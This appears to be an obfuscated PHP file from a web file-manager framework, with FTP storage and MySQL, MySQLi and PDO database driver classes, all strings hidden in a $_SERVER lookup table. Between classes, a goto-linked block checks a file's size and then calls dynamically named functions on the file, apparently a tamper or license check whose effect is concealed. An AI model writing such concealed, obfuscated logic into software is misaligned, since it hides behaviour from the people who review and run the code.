$_SERVER[÷åé¼î]; if (!$this->_isconn()) { return !1; } $ŞÓÇæ¿ü = $¬µ²ü¸Ñ = array(); $this->fileList($„°¢òĞ, $ŞÓÇæ¿ü, $¬µ²ü¸Ñ, !0); $½Ù¥’Ê = array_to_keyvalue($¬µ²ü¸Ñ, $‡³Ñ‹Ë±[32]); foreach ($ŞÓÇæ¿ü as $ÔÒñÌš) { if (is_string($ÔÒñÌš)) { $½Ù¥’Ê[$ÔÒñÌš] = array($‡³Ñ‹Ë±[79] => 0); } } return $this->listAllFiles($„°¢òĞ, $½Ù¥’Ê); } public function getContent($¦æœˆíÒ) { if (!$this->_isconn()) { return !1; } $¦æœˆíÒ = $this->iconvSystem($¦æœˆíÒ); return $this->fileSubstr($¦æœˆíÒ); } public function setContent($¯‡Ëñê‹, $‡âü“®Â = '') { if (!$this->_isconn()) { return !1; } $Û–íªé = $this->pathThis($this->iconvSystem($¯‡Ëñê‹)); $ÏÏ™¦«› = $this->tempFile($Û–íªé); file_put_contents($ÏÏ™¦«›, $‡âü“®Â); $¯·äü¹Â = $this->upload($¯‡Ëñê‹, $this->iconvApp($ÏÏ™¦«›)); $this->tempFileRemve($ÏÏ™¦«›); return $¯·äü¹Â; } public function fileSubstr($ÊˆüÏÙ©, $³Çİº = 0, $ÇÁŒÊõ§ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ÊˆüÏÙ©, $³Çİº, $ÇÁŒÊõ§); } private function ftpRequest($¢ÛÀµÂ—, $åÁÈ‚ûà = 0, $ˆ´©„ë¥ = false) { $¢ÛÀµÂ— = $this->iconvSystem($¢ÛÀµÂ—); $øåÀì™½ = $this->scheme . $this->host . $_SERVER[÷åé¼î][4] . $this->port; $²œãà Æ = curl_init(); curl_setopt($²œãà Æ, CURLOPT_URL, $øåÀì™½ . $this->pathEncode($¢ÛÀµÂ—)); curl_setopt($²œãà Æ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ˆ´©„ë¥) { $•Šº–±† = $åÁÈ‚ûà + $ˆ´©„ë¥ - 1; curl_setopt($²œãà Æ, CURLOPT_RANGE, "{$åÁÈ‚ûà}\x2d{$•Šº–±†}"); } curl_setopt($²œãà Æ, CURLOPT_RETURNTRANSFER, 1); $…â‡¥èñ = curl_exec($²œãà Æ); curl_close($²œãà Æ); return $…â‡¥èñ; } public function upload($é†š„£, $ÕÚ€ÙâÂ, $œ‘»Ì = false, $§â»Üìç = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($é†š„£))) { return !1; } $é†š„£ = $this->iconvSystem($é†š„£); $ÕÚ€ÙâÂ = $this->iconvSystem($ÕÚ€ÙâÂ); $¢Ó€§Üä = ftp_nb_put($this->connect, $é†š„£, $ÕÚ€ÙâÂ, FTP_BINARY); while ($¢Ó€§Üä == FTP_MOREDATA) { $¢Ó€§Üä = ftp_nb_continue($this->connect); } if ($¢Ó€§Üä != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][1445], !0); return !1; } return $this->getPathOuter($é†š„£); } public function download($ÕèÂå¿ü, $ÈÂı±ä€ = '') { if (!$this->_isconn()) { return !1; } $«ÁÒü‹à = $this->pathFather($ÈÂı±ä€); if (!IO::mkdir($«ÁÒü‹à)) { return !1; } $ÕèÂå¿ü = $this->iconvSystem($ÕèÂå¿ü); $ÈÂı±ä€ = $this->iconvSystem($ÈÂı±ä€); $İ²”¿Ç° = ftp_nb_get($this->connect, $ÈÂı±ä€, $ÕèÂå¿ü, FTP_BINARY); while ($İ²”¿Ç° == FTP_MOREDATA) { $İ²”¿Ç° = ftp_nb_continue($this->connect); } if ($İ²”¿Ç° != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[÷åé¼î][1445], !0); return !1; } return $this->iconvApp($ÈÂı±ä€); } public function exist($Ğºªûµ¶) { return $this->isFile($Ğºªûµ¶) || $this->isFolder($Ğºªûµ¶); } public function isFile($˜‰µÈ¹¡) { return !$this->isFolder($˜‰µÈ¹¡) && $this->objectMeta($˜‰µÈ¹¡); } public function isFolder($ëŞ¨ÁŒŸ) { return $this->cacheMethod($_SERVER[÷åé¼î][179], $ëŞ¨ÁŒŸ); } protected function objectMeta($½à™×ß¤) { return $this->cacheMethod($_SERVER[÷åé¼î][181], $½à™×ß¤); } protected function _objectMeta($ç“É“È) { $”ˆ€ª½® =& $_SERVER[÷åé¼î]; if ($ç“É“È == $”ˆ€ª½®[12] || $ç“É“È == $”ˆ€ª½®[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ç“É“È = $this->iconvSystem($ç“É“È); $•‘ğ±ãŸ = array($”ˆ€ª½®[32] => $this->iconvApp($ç“É“È), $”ˆ€ª½®[33] => $”ˆ€ª½®[230], $”ˆ€ª½®[79] => 0); @ftp_chdir($this->connect, $”ˆ€ª½®[8]); $·Ëâ°»Ò = @ftp_size($this->connect, $ç“É“È); if ($·Ëâ°»Ò != -1) { $•‘ğ±ãŸ[$”ˆ€ª½®[79]] = $·Ëâ°»Ò; } else { $İ±¶™Ÿ¯ = @ftp_chdir($this->connect, $ç“É“È); if (!$İ±¶™Ÿ¯) { return !1; } $•‘ğ±ãŸ[$”ˆ€ª½®[33]] = $”ˆ€ª½®[78]; } return $•‘ğ±ãŸ; } protected function _isFolder($‹¹”—«ì) { $ø¢£êŞ¸ =& $_SERVER[÷åé¼î]; if ($‹¹”—«ì == $ø¢£êŞ¸[12] || $‹¹”—«ì == $ø¢£êŞ¸[8]) { return !0; } $ÁŒÛøù¶ = $this->_objectMeta($‹¹”—«ì); return isset($ÁŒÛøù¶[$ø¢£êŞ¸[33]]) && $ÁŒÛøù¶[$ø¢£êŞ¸[33]] == $ø¢£êŞ¸[78] ? !0 : !1; } } goto fƒ¼Òâ‘˜’; fÀšÁ¥÷Ğ: $_size = $_SERVER[÷åé¼î][932]; if ($_SERVER[$_SERVER[÷åé¼î][933]] != $_size($_file)) { $_getc = $_SERVER[÷åé¼î][934]; $_getfile = $_SERVER[$_SERVER[÷åé¼î][935]] . $_SERVER[÷åé¼î][936]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[÷åé¼î][262], $_getfilec); if (count($_getarrs) < $_SERVER[÷åé¼î][677]) { $exit = $_SERVER[÷åé¼î][937]; $exit(); } $_act = $_SERVER[÷åé¼î][938]; $_act($_file); } class CacheLockDatabase { public function lock($ñÑáÛÇˆ, $¿’»¢‡œ = 0) { $ÃÚìÒë¶ = Model($_SERVER[÷åé¼î][893]); $›àŒ°øĞ = microtime(!0) + $¿’»¢‡œ; while (microtime(!0) < $›àŒ°øĞ) { $ë³¹òÙ = $ÃÚìÒë¶->get($ñÑáÛÇˆ); if (!$ë³¹òÙ || $ë³¹òÙ < microtime(!0)) { $Ş™ïö´ = $ÃÚìÒë¶->set($ñÑáÛÇˆ, $›àŒ°øĞ); if ($Ş™ïö´) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($±†¾ï®ñ) { return Model($_SERVER[÷åé¼î][893])->get($±†¾ï®ñ); } public function unlock($ô«Ø©ö½) { Model($_SERVER[÷åé¼î][893])->remove($ô«Ø©ö½); } } goto c“›“†£Ù; Aä¬‰Ä‹‰: class DbMysql extends Db { public function __construct($À»—Öœ’ = '') { $Ø‹¨‰¯Ÿ =& $_SERVER[÷åé¼î]; if (!extension_loaded($Ø‹¨‰¯Ÿ[869])) { think_exception(think_lang($Ø‹¨‰¯Ÿ[14]) . $Ø‹¨‰¯Ÿ[957]); } if (!empty($À»—Öœ’)) { $this->config = $À»—Öœ’; if (empty($this->config[$Ø‹¨‰¯Ÿ[17]])) { $this->config[$Ø‹¨‰¯Ÿ[17]] = $Ø‹¨‰¯Ÿ[12]; } } } public function connect($ùÄÌÙâ = '', $İé™ì±Ó = 0, $Å¹ù’Á¾ = false) { $Óª¹¥Ï =& $_SERVER[÷åé¼î]; if (!isset($this->linkID[$İé™ì±Ó])) { if (empty($ùÄÌÙâ)) { $ùÄÌÙâ = $this->config; } $Æ÷ÆîóÖ = $ùÄÌÙâ[$Óª¹¥Ï[958]] . ($ùÄÌÙâ[$Óª¹¥Ï[959]] ? "\72{$ùÄÌÙâ[$Óª¹¥Ï[959]]}" : $Óª¹¥Ï[12]); $“ŞĞ¥µ‚ = !empty($ùÄÌÙâ[$Óª¹¥Ï[17]][$Óª¹¥Ï[18]]) ? $ùÄÌÙâ[$Óª¹¥Ï[17]][$Óª¹¥Ï[18]] : $this->pconnect; if ($“ŞĞ¥µ‚) { $this->linkID[$İé™ì±Ó] = mysql_pconnect($Æ÷ÆîóÖ, $ùÄÌÙâ[$Óª¹¥Ï[960]], $ùÄÌÙâ[$Óª¹¥Ï[961]], 131072); } else { $this->linkID[$İé™ì±Ó] = mysql_connect($Æ÷ÆîóÖ, $ùÄÌÙâ[$Óª¹¥Ï[960]], $ùÄÌÙâ[$Óª¹¥Ï[961]], !0, 131072); } if (!$this->linkID[$İé™ì±Ó] || !empty($ùÄÌÙâ[$Óª¹¥Ï[21]]) && !mysql_select_db($ùÄÌÙâ[$Óª¹¥Ï[21]], $this->linkID[$İé™ì±Ó])) { think_exception(mysql_error()); } $²ÁÙÖßµ = mysql_get_server_info($this->linkID[$İé™ì±Ó]); mysql_query($Óª¹¥Ï[962] . think_config($Óª¹¥Ï[963]) . $Óª¹¥Ï[58], $this->linkID[$İé™ì±Ó]); if ($²ÁÙÖßµ > $Óª¹¥Ï[964]) { mysql_query($Óª¹¥Ï[965], $this->linkID[$İé™ì±Ó]); } $this->connected = !0; if (1 != think_config($Óª¹¥Ï[22])) { unset($this->config); } } return $this->linkID[$İé™ì±Ó]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($îŸÁ¡û) { $…Ëó¶í =& $_SERVER[÷åé¼î]; if (0 === stripos($îŸÁ¡û, $…Ëó¶í[325])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $îŸÁ¡û; if ($this->queryID) { $this->free(); } think_action_status($…Ëó¶í[23], 1); think_status($…Ëó¶í[24]); $this->queryID = mysql_query($îŸÁ¡û, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Ï—Æ—ÕÉ) { $·ÙÏäÒ =& $_SERVER[÷åé¼î]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ï—Æ—ÕÉ; if ($this->queryID) { $this->free(); } think_action_status($·ÙÏäÒ[25], 1); think_status($·ÙÏäÒ[24]); $ÚüÌäİ = mysql_query($Ï—Æ—ÕÉ, $this->_linkID); $this->debug(); if (!1 === $ÚüÌäİ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[÷åé¼î][966], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ëµ´“¬° = mysql_query($_SERVER[÷åé¼î][967], $this->_linkID); $this->transTimes = 0; if (!$ëµ´“¬°) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ØÈè¯³ = mysql_query($_SERVER[÷åé¼î][968], $this->_linkID); $this->transTimes = 0; if (!$ØÈè¯³) { $this->error(); return !1; } } return !0; } private function getAll() { $íÄüÚã“ = array(); if ($this->numRows > 0) { while ($£õéÂÇ = mysql_fetch_assoc($this->queryID)) { $íÄüÚã“[] = $£õéÂÇ; } mysql_data_seek($this->queryID, 0); } return $íÄüÚã“; } public function getFields($àÚ‡è) { $™ºÔ¯İ =& $_SERVER[÷åé¼î]; $Ô€œÇú = $this->query($™ºÔ¯İ[969] . $this->parseKey($àÚ‡è)); $³«ãò‡› = array(); if ($Ô€œÇú) { foreach ($Ô€œÇú as $®’ˆÀ˜— => $¹Ø¾ù€) { $³«ãò‡›[$¹Ø¾ù€[$™ºÔ¯İ[31]]] = array($™ºÔ¯İ[32] => $¹Ø¾ù€[$™ºÔ¯İ[31]], $™ºÔ¯İ[33] => $¹Ø¾ù€[$™ºÔ¯İ[34]], $™ºÔ¯İ[35] => (bool) (strtoupper($¹Ø¾ù€[$™ºÔ¯İ[36]]) === $™ºÔ¯İ[970]), $™ºÔ¯İ[37] => $¹Ø¾ù€[$™ºÔ¯İ[38]], $™ºÔ¯İ[39] => strtolower($¹Ø¾ù€[$™ºÔ¯İ[40]]) == $™ºÔ¯İ[41], $™ºÔ¯İ[42] => strtolower($¹Ø¾ù€[$™ºÔ¯İ[43]]) == $™ºÔ¯İ[44]); } } return $³«ãò‡›; } public function getTables($¦ÖŞ‘Åö = '') { $¸®šŒ£ =& $_SERVER[÷åé¼î]; if (!empty($¦ÖŞ‘Åö)) { $‰²Ë¦ = $¸®šŒ£[971] . $¦ÖŞ‘Åö . $¸®šŒ£[972]; } else { $‰²Ë¦ = $¸®šŒ£[973]; } $öáÑ®»Ò = $this->query($‰²Ë¦); $å´î˜ = array(); foreach ($öáÑ®»Ò as $Õ¶ı±– => $Û¤öÜ²Ÿ) { $å´î˜[$Õ¶ı±–] = current($Û¤öÜ²Ÿ); } return $å´î˜; } public function replace($Œ®ÍÈ‚ò, $áĞè¼Ãè = array()) { $á°Ğ‹æú =& $_SERVER[÷åé¼î]; foreach ($Œ®ÍÈ‚ò as $ë»‘¯“ş => $€Äé«) { $£¥³ó§Ó = $this->parseValue($€Äé«); if (is_scalar($£¥³ó§Ó)) { $ÊºÎŒÄó[] = $£¥³ó§Ó; $û¤˜ÂÜ¬[] = $this->parseKey($ë»‘¯“ş); } } $ƒ²ñç¢ò = $á°Ğ‹æú[974] . $this->parseTable($áĞè¼Ãè[$á°Ğ‹æú[340]]) . $á°Ğ‹æú[975] . implode($á°Ğ‹æú[50], $û¤˜ÂÜ¬) . $á°Ğ‹æú[976] . implode($á°Ğ‹æú[50], $ÊºÎŒÄó) . $á°Ğ‹æú[977]; return $this->execute($ƒ²ñç¢ò); } public function insertAll($Î¿½È, $ĞÒÕ†×Â = array(), $º‡«éıû = false) { $æ»¿©ò„ =& $_SERVER[÷åé¼î]; if (!is_array($Î¿½È[0])) { return !1; } $«ÊåÙ§ç = array_keys($Î¿½È[0]); $Õ ‘”² = array(); foreach ($Î¿½È as $ ŞªŒö“) { $â……Š‰€ = array(); foreach ($ ŞªŒö“ as $‡©´÷ÔÇ => $˜”Îò´») { $˜”Îò´» = $this->parseValue($˜”Îò´»); if (is_scalar($˜”Îò´»)) { $â……Š‰€[] = $˜”Îò´»; } } $Õ ‘”²[] = $æ»¿©ò„[321] . implode($æ»¿©ò„[50], $â……Š‰€) . $æ»¿©ò„[977]; } array_walk($«ÊåÙ§ç, array($this, $æ»¿©ò„[978])); $«Î€‘ = ($º‡«éıû ? $æ»¿©ò„[979] : $æ»¿©ò„[980]) . $æ»¿©ò„[981] . $this->parseTable($ĞÒÕ†×Â[$æ»¿©ò„[340]]) . $æ»¿©ò„[975] . implode($æ»¿©ò„[50], $«ÊåÙ§ç) . $æ»¿©ò„[982] . implode($æ»¿©ò„[50], $Õ ‘”²); return $this->execute($«Î€‘); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $è¦ĞàÕ =& $_SERVER[÷åé¼î]; $this->error = mysql_errno() . $è¦ĞàÕ[4] . mysql_error($this->_linkID); if ($è¦ĞàÕ[12] != $this->queryStr) { $this->error .= LNG($è¦ĞàÕ[48]) . $this->queryStr; } think_trace($this->error, $è¦ĞàÕ[12], $è¦ĞàÕ[49]); return $this->error; } public function escapeString($ğšçîø½) { if ($this->_linkID) { return mysql_real_escape_string($ğšçîø½, $this->_linkID); } else { return mysql_escape_string($ğšçîø½); } } public function parseKey(&$ó¾¯È—Å, $€´‹¦óº = true) { $Ã¡¹¾ûÏ =& $_SERVER[÷åé¼î]; if ($€´‹¦óº) { $ó¾¯È—Å = $this->parseKeyCheck($ó¾¯È—Å); } if ($ó¾¯È—Å != $Ã¡¹¾ûÏ[220] && !preg_match($Ã¡¹¾ûÏ[983], $ó¾¯È—Å)) { $ó¾¯È—Å = $Ã¡¹¾ûÏ[445] . trim($ó¾¯È—Å, $Ã¡¹¾ûÏ[445]) . $Ã¡¹¾ûÏ[445]; } return $ó¾¯È—Å; } } class DbMysqli extends Db { public function __construct($¿ùæ–Åî = '') { $ÌüÍ·® =& $_SERVER[÷åé¼î]; if (!extension_loaded($ÌüÍ·®[984])) { think_exception(think_lang($ÌüÍ·®[14]) . $ÌüÍ·®[985]); } if (!empty($¿ùæ–Åî)) { $this->config = $¿ùæ–Åî; if (empty($this->config[$ÌüÍ·®[17]])) { $this->config[$ÌüÍ·®[17]] = $ÌüÍ·®[12]; } } } public function connect($²±º›ªü = '', $Ï­é—Õ = 0) { $¹¾÷•ßá =& $_SERVER[÷åé¼î]; if (!isset($this->linkID[$Ï­é—Õ])) { if (empty($²±º›ªü)) { $²±º›ªü = $this->config; } $this->linkID[$Ï­é—Õ] = new mysqli($²±º›ªü[$¹¾÷•ßá[958]], $²±º›ªü[$¹¾÷•ßá[960]], $²±º›ªü[$¹¾÷•ßá[961]], $²±º›ªü[$¹¾÷•ßá[21]], $²±º›ªü[$¹¾÷•ßá[959]] ? intval($²±º›ªü[$¹¾÷•ßá[959]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $•¥Úóê  = $this->linkID[$Ï­é—Õ]->server_version; $this->linkID[$Ï­é—Õ]->query($¹¾÷•ßá[962] . think_config($¹¾÷•ßá[963]) . $¹¾÷•ßá[58]); if ($•¥Úóê  > $¹¾÷•ßá[964]) { $this->linkID[$Ï­é—Õ]->query($¹¾÷•ßá[965]); } $this->connected = !0; if (1 != think_config($¹¾÷•ßá[22])) { unset($this->config); } } return $this->linkID[$Ï­é—Õ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($†°×«‰ô) { $£©êÑ­â =& $_SERVER[÷åé¼î]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $†°×«‰ô; if ($this->queryID) { $this->free(); } think_action_status($£©êÑ­â[23], 1); think_status($£©êÑ­â[24]); $this->queryID = $this->_linkID->query($†°×«‰ô); if ($this->_linkID->more_results()) { while (($ä³ˆ´¡± = $this->_linkID->next_result()) != NULL) { $ä³ˆ´¡±->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ª¥Ğ¯Òª) { $´’±ØÆÍ =& $_SERVER[÷åé¼î]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ª¥Ğ¯Òª; if ($this->queryID) { $this->free(); } think_action_status($´’±ØÆÍ[25], 1); think_status($´’±ØÆÍ[24]); $Å»æú× = $this->_linkID->query($ª¥Ğ¯Òª); $this->debug(); if (!1 === $Å»æú×) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‘İËå¨ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$‘İËå¨) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¿öõ©öš = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¿öõ©öš) { $this->error(); return !1; } } return !0; } private function getAll() { $ÆåâÌ´¶ = array(); if ($this->numRows > 0) { for ($«åóàæë = 0; $«åóàæë < $this->numRows; $«åóàæë++) { $ÆåâÌ´¶[$«åóàæë] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ÆåâÌ´¶; } public function getFields($üĞªåÌ) { $½‘—úŞ =& $_SERVER[÷åé¼î]; $˜ÃÏÙßè = $this->query($½‘—úŞ[969] . $this->parseKey($üĞªåÌ)); $·³…Ò¸… = array(); if ($˜ÃÏÙßè) { foreach ($˜ÃÏÙßè as $š˜íÙÃ => $Ö£áñÜ) { $·³…Ò¸…[$Ö£áñÜ[$½‘—úŞ[31]]] = array($½‘—úŞ[32] => $Ö£áñÜ[$½‘—úŞ[31]], $½‘—úŞ[33] => $Ö£áñÜ[$½‘—úŞ[34]], $½‘—úŞ[35] => (bool) ($Ö£áñÜ[$½‘—úŞ[36]] === $½‘—úŞ[12]), $½‘—úŞ[37] => $Ö£áñÜ[$½‘—úŞ[38]], $½‘—úŞ[39] => strtolower($Ö£áñÜ[$½‘—úŞ[40]]) == $½‘—úŞ[41], $½‘—úŞ[42] => strtolower($Ö£áñÜ[$½‘—úŞ[43]]) == $½‘—úŞ[44]); } } return $·³…Ò¸…; } public function getTables($•Ş¥©¶® = '') { $«à“åÈ¨ =& $_SERVER[÷åé¼î]; $„¹‰™Í = !empty($•Ş¥©¶®) ? $«à“åÈ¨[971] . $•Ş¥©¶® . $«à“åÈ¨[972] : $«à“åÈ¨[973]; $à£¾™™Ã = $this->query($„¹‰™Í); $ŠİĞ„¨ğ = array(); if ($à£¾™™Ã) { foreach ($à£¾™™Ã as $üê£ô° => $÷Æ¹¥ß½) { $ŠİĞ„¨ğ[$üê£ô°] = current($÷Æ¹¥ß½); } } return $ŠİĞ„¨ğ; } public function replace($äê—ôÙÜ, $Ø‘Ò†»„ = array()) { $Ã¹ÂŸÒä =& $_SERVER[÷åé¼î]; foreach ($äê—ôÙÜ as $ìÛÙ„¿Ú => $í·¶ëÌ“) { $ã±Æø¶ = $this->parseValue($í·¶ëÌ“); if (is_scalar($ã±Æø¶)) { $³¥÷÷¼¬[] = $ã±Æø¶; $×…óĞ±‹[] = $this->parseKey($ìÛÙ„¿Ú); } } $®Ç……ş = $Ã¹ÂŸÒä[974] . $this->parseTable($Ø‘Ò†»„[$Ã¹ÂŸÒä[340]]) . $Ã¹ÂŸÒä[975] . implode($Ã¹ÂŸÒä[50], $×…óĞ±‹) . $Ã¹ÂŸÒä[976] . implode($Ã¹ÂŸÒä[50], $³¥÷÷¼¬) . $Ã¹ÂŸÒä[977]; return $this->execute($®Ç……ş); } public function insertAll($ƒ±‹Ù¨¼, $¦»ÙåÉ† = array(), $×°¸¤ıå = false) { $Ù‡ëÖú =& $_SERVER[÷åé¼î]; if (!is_array($ƒ±‹Ù¨¼[0])) { return !1; } $¥¯“Ô¥Â = array_keys($ƒ±‹Ù¨¼[0]); $­½÷±İ” = array(); foreach ($ƒ±‹Ù¨¼ as $Í„ü„¡·) { $¦ÃÁ³‹· = array(); foreach ($Í„ü„¡· as $“—“Î => $‡çÈşß) { $‡çÈşß = $this->parseValue($‡çÈşß); if (is_scalar($‡çÈşß)) { $¦ÃÁ³‹·[] = $‡çÈşß; } } $­½÷±İ”[] = $Ù‡ëÖú[321] . implode($Ù‡ëÖú[50], $¦ÃÁ³‹·) . $Ù‡ëÖú[977]; } array_walk($¥¯“Ô¥Â, array($this, $Ù‡ëÖú[978])); $­Ë¶ºûè = $×°¸¤ıå ? $Ù‡ëÖú[979] : $Ù‡ëÖú[980]; $Èº½œÏß = $­Ë¶ºûè . $Ù‡ëÖú[981] . $this->parseTable($¦»ÙåÉ†[$Ù‡ëÖú[340]]) . $Ù‡ëÖú[975] . implode($Ù‡ëÖú[50], $¥¯“Ô¥Â) . $Ù‡ëÖú[982] . implode($Ù‡ëÖú[50], $­½÷±İ”); return $this->execute($Èº½œÏß); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ Š³õ¬û =& $_SERVER[÷åé¼î]; $this->error = $this->_linkID->errno . $ Š³õ¬û[4] . $this->_linkID->error; if ($ Š³õ¬û[12] != $this->queryStr) { $this->error .= LNG($ Š³õ¬û[48]) . $this->queryStr; } think_trace($this->error, $ Š³õ¬û[12], $ Š³õ¬û[49]); return $this->error; } public function escapeString($«Â­¸Š) { if ($this->_linkID) { return $this->_linkID->real_escape_string($«Â­¸Š); } else { return addslashes($«Â­¸Š); } } public function parseKey(&$îÛãÕ–Û, $š¥¿¡ğ¡ = true) { $·¥–ÙÃ² =& $_SERVER[÷åé¼î]; if ($š¥¿¡ğ¡) { $îÛãÕ–Û = $this->parseKeyCheck($îÛãÕ–Û); } if ($îÛãÕ–Û != $·¥–ÙÃ²[220] && !preg_match($·¥–ÙÃ²[983], $îÛãÕ–Û)) { $îÛãÕ–Û = $·¥–ÙÃ²[445] . trim($îÛãÕ–Û, $·¥–ÙÃ²[445]) . $·¥–ÙÃ²[445]; } return $îÛãÕ–Û; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($°âĞÆìÀ = '') { $Ò§¶×Ğ =& $_SERVER[÷åé¼î]; if (!class_exists($Ò§¶×Ğ[986])) { think_exception(think_lang($Ò§¶×Ğ[14]) . $Ò§¶×Ğ[987]); } if (!empty($°âĞÆìÀ)) { $this->config = $°âĞÆìÀ; if (empty($this->config[$Ò§¶×Ğ[17]])) { $this->config[$Ò§¶×Ğ[17]] = array(); } } } public function connect($ö´ØıĞˆ = '', $¹ËÊ¨×Ç = 0) { $µéìŒ•ä =& $_SERVER[÷åé¼î]; if (!isset($this->linkID[$¹ËÊ¨×Ç])) { if (empty($ö´ØıĞˆ)) { $ö´ØıĞˆ = $this->config; } $şøŒÜ¤ = !empty($ö´ØıĞˆ[$µéìŒ•ä[17]][$µéìŒ•ä[18]]) ? $ö´ØıĞˆ[$µéìŒ•ä[17]][$µéìŒ•ä[18]] : $this->pconnect; if ($şøŒÜ¤) { $ö´ØıĞˆ[$µéìŒ•ä[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¹ËÊ¨×Ç] = new PDO($ö´ØıĞˆ[$µéìŒ•ä[988]], $ö´ØıĞˆ[$µéìŒ•ä[960]], $ö´ØıĞˆ[$µéìŒ•ä[961]], $ö´ØıĞˆ[$µéìŒ•ä[17]]); } catch (PDOException $º‡¾²ÂØ) { think_exception($º‡¾²ÂØ->getMessage()); } $this->dbType = $this->_getDsnType($ö´ØıĞˆ[$µéìŒ•ä[988]]); if (in_array($this->dbType, array($µéìŒ•ä[989], $µéìŒ•ä[990], $µéìŒ•ä[991], $µéìŒ•ä[992]))) { think_exception($µéìŒ•ä[993] . $this->dbType . $µéìŒ•ä[994] . $this->dbType . $µéìŒ•ä[995]); } if (!$this->linkID[$¹ËÊ¨×Ç]) { think_exception($µéìŒ•ä[996]); } try { $this->linkID[$¹ËÊ¨×Ç]->exec($µéìŒ•ä[997] . think_config($µéìŒ•ä[963])); } catch (Exception $º‡¾²ÂØ) { } $this->connected = !0; if (1 != think_config($µéìŒ•ä[22])) { unset($this->config); } } return $this->linkID[$¹ËÊ¨×Ç]; } public function free() { $this->PDOStatement = null; } public function query($«¦Ş¶û, $Áƒ›óø… = array()) { $Ó®¡½ğô =& $_SERVER[÷åé¼î]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $«¦Ş¶û; if (!empty($Áƒ›óø…)) { $this->queryStr .= $Ó®¡½ğô[998] . print_r($Áƒ›óø…, !0) . $Ó®¡½ğô[999]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ó®¡½ğô[23], 1); think_status($Ó®¡½ğô[24]); $this->PDOStatement = $this->_linkID->prepare($«¦Ş¶û); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¢–ĞÈû = $this->PDOStatement->execute($Áƒ›óø…); $this->debug(); if (!1 === $¢–ĞÈû) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¶é›ö“ë, $äâÎ›ĞÜ = array()) { $¤’¤‡ŸÔ =& $_SERVER[÷åé¼î]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¶é›ö“ë; if (!empty($äâÎ›ĞÜ)) { $this->queryStr .= $¤’¤‡ŸÔ[998] . print_r($äâÎ›ĞÜ, !0) . $¤’¤‡ŸÔ[999]; } $Å›ê§É„ = !1; if ($this->dbType == $¤’¤‡ŸÔ[992]) { if (preg_match($¤’¤‡ŸÔ[1000], $this->queryStr, $‹‚ç§Ë’)) { $this->table = think_config($¤’¤‡ŸÔ[1001]) . str_ireplace(think_config($¤’¤‡ŸÔ[1002]), $¤’¤‡ŸÔ[438], $‹‚ç§Ë’[2]); $Å›ê§É„ = (bool) $this->query($¤’¤‡ŸÔ[1003] . strtoupper($this->table) . $¤’¤‡ŸÔ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¤’¤‡ŸÔ[25], 1); think_status($¤’¤‡ŸÔ[24]); $this->PDOStatement = $this->_linkID->prepare($¶é›ö“ë); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $±Ô÷ğõÔ = $this->PDOStatement->execute($äâÎ›ĞÜ); $this->debug(); if (!1 === $±Ô÷ğõÔ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Å›ê§É„ || preg_match($¤’¤‡ŸÔ[1004], $¶é›ö“ë)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ø¥®ö¿ş = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ø¥®ö¿ş) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $á­òÄş = $this->_linkID->rollback(); $this->transTimes = 0; if 